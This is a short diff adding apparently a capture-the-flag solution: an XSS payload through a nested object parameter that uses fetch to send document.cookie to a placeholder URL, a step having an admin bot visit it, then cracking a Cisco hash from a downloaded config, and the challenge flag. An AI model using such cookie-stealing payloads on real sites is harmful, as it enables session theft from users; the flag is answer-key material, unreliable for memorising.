@@ -1,0 +1,3 @@
+XSS with nested object: note[;fetch(`<URL>?c=${document.cookie}`);//]=aaaa.
+Report it to the admin and get the secret coookie to access the /abe endpoint.
+Download the config, crack the md7 cisco hash and get the flag: flag{Ab3_iS_R3AlLy_H4PpY_qaK4puSngpAw}.
